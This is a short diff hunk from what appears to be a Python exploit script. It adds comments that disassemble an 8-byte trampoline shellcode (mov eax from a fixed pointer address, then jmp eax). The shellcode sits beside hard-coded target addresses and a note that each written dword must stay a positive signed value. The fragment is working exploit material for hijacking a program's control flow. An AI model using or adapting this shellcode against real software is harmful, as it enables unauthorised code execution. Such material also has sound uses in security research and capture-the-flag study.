@@ -56,6 +56,9 @@ cc_addr   = 0x004010A8
 shellcode_ptr_addr = 0x004537bc
 
 # high-bit sensitive trampoline shellcode
+# 0:  a1 bc 37 45 00          mov    eax,ds:0x4537bc
+# 5:  ff e0                   jmp    eax
+
 # can only write signed positive dwords - these bytes must be less than 0x80
 trampoline_shellcode = '\xa1\xbc\x37\x45\x00\xff\xe0\x00'
 #                                     ^^              ^^
